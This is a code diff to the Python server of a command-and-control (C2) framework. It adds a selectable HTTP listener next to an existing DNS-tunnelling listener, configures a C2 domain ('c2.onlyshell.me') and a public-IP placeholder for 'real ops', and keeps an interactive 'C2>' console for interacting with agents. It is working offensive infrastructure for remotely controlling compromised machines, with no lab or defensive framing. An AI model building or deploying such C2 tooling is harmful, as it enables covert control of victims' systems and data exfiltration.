@@ -12,39 +12,54 @@ sys.path.append(os.path.join(os.path.dirname(__file__), 'utils'))
 # Import modules (will be created in subsequent steps)
 from logger import setup_logger
 from db_manager import DBManager 
-from dns_listener import DNSListener
+from modules.dns_listener import DNSListener 
+from modules.http_listener import HTTPListener # NEW Import for HTTP Listener
+
 
 # Set up logging
 logger = setup_logger('c2_server', 'server.log')
+
+COMMUNICATION_METHOD = "HTTP"
 
 class C2Server:
     def __init__(self):
         self.db_path = os.path.join(os.path.dirname(__file__), 'database', 'c2.db')
         self.db_manager = DBManager(self.db_path)
         logger.info(f"C2 Server initializing. Database at: {self.db_path}")
-        self.db_manager.initialize_db() # Ensure tables exist
+        self.db_manager.initialize_db()
 
         self.agents = {} # In-memory cache for active agents {agent_id: agent_object}
-        # In a real scenario, this would involve loading from DB and handling beaconing
-         # --- DNS Tunneling Configuration ---
-        # IMPORTANT: REPLACE THESE WITH YOUR ACTUAL DOMAIN AND C2 SERVER'S PUBLIC IP
-        self.c2_domain = "c2.example.com" # e.g., "command.yourdomain.com"
-        # Get the C2 server's external IP automatically (best effort) or set manually
-        # This is a rough way to get your public IP; for production, set it explicitly or use a service
-        try:
-            # Use a public service to get external IP, or manually configure
-            # This needs to be the IP agents can resolve your C2_DOMAIN to
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80)) # Connect to a public DNS server
-            self.c2_ip = s.getsockname()[0]
-            s.close()
-            logger.info(f"Automatically determined C2 Server IP: {self.c2_ip}")
-        except Exception as e:
-            logger.warning(f"Could not auto-determine C2 IP, defaulting to 127.0.0.1. Error: {e}")
-            self.c2_ip = "127.0.0.1" # Fallback, you MUST change this to your public IP for real ops
+        self.listener = None # To hold the active communication listener instance
 
-        self.dns_listener = DNSListener(self.c2_domain, self.c2_ip, self.db_manager)
-        # --- End DNS Tunneling Configuration ---
+        if COMMUNICATION_METHOD == "HTTP":
+            # HTTP Listener Configuration
+            self.http_host = "0.0.0.0" # Listen on all available interfaces
+            self.http_port = 8080      # Choose an unprivileged port for initial testing
+            logger.info(f"Using HTTP Listener on {self.http_host}:{self.http_port}")
+            self.listener = HTTPListener(self.http_host, self.http_port, self.db_manager)
+
+        elif COMMUNICATION_METHOD == "DNS":
+            # DNS Listener Configuration
+            # IMPORTANT: REPLACE THESE WITH YOUR ACTUAL DOMAIN AND C2 SERVER'S PUBLIC IP
+            self.c2_domain = "c2.onlyshell.me" # e.g., "command.yourdomain.com"
+            self.c2_ip = "YOUR_C2_SERVER_PUBLIC_IP" # Replace with your C2 server's public IP
+            # If you want to try auto-determining the IP (less reliable for production):
+            # try:
+            #     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            #     s.connect(("8.8.8.8", 80))
+            #     self.c2_ip = s.getsockname()[0]
+            #     s.close()
+            #     logger.info(f"Automatically determined C2 Server IP for DNS: {self.c2_ip}")
+            # except Exception as e:
+            #     logger.warning(f"Could not auto-determine C2 IP for DNS, defaulting to 127.0.0.1. Error: {e}")
+            #     self.c2_ip = "127.0.0.1"
+
+            logger.info(f"Using DNS Listener for domain: {self.c2_domain} at IP: {self.c2_ip}")
+            self.listener = DNSListener(self.c2_domain, self.c2_ip, self.db_manager)
+
+        else:
+            logger.critical(f"Unknown COMMUNICATION_METHOD: {COMMUNICATION_METHOD}. Exiting.")
+            sys.exit(1) # Exit if invalid method is specified
     def _help_command(self):
         """Displays available commands."""
         print("\nAvailable commands:")
@@ -103,15 +118,19 @@ class C2Server:
         """Starts the interactive C2 CLI."""
         print("Starting C2 Server CLI...")
         print("Type 'help' for a list of commands.")
-        self.dns_listener.start() # Start the DNS listener thread
-        logger.info("DNS Listener started as part of C2 server.")
+
+        if self.listener:
+            self.listener.start() # Start the chosen listener
+            logger.info(f"{COMMUNICATION_METHOD} Listener started as part of C2 server.")
+        else:
+            logger.error("No communication listener configured or started. Check COMMUNICATION_METHOD.")
+
         while True:
             try:
                 command_line = input("C2> ").strip()
                 if not command_line:
                     continue
 
-                # Use shlex to handle commands with arguments and quotes
                 parts = shlex.split(command_line)
                 command = parts[0].lower()
                 args = parts[1:]
@@ -127,17 +146,18 @@ class C2Server:
                         print("Usage: interact <agent_id>")
                 elif command == 'exit':
                     logger.info("Shutting down C2 server.")
-                    self.dns_listener.stop()
+                    if self.listener:
+                        self.listener.stop() # Stop the active listener
                     print("Shutting down C2 server. Goodbye!")
                     break
                 elif command == 'clear':
                     os.system('cls' if os.name == 'nt' else 'clear')
                 else:
                     print(f"Unknown command: '{command}'. Type 'help' for available commands.")
-            except EOFError: # Handles Ctrl+D (Unix)
+            except EOFError:
                 print("\nReceived EOF. Exiting C2 server.")
                 break
-            except KeyboardInterrupt: # Handles Ctrl+C
+            except KeyboardInterrupt:
                 print("\nCtrl+C detected. Type 'exit' to shut down gracefully.")
             except Exception as e:
                 logger.error(f"An unexpected error occurred in CLI: {e}", exc_info=True)
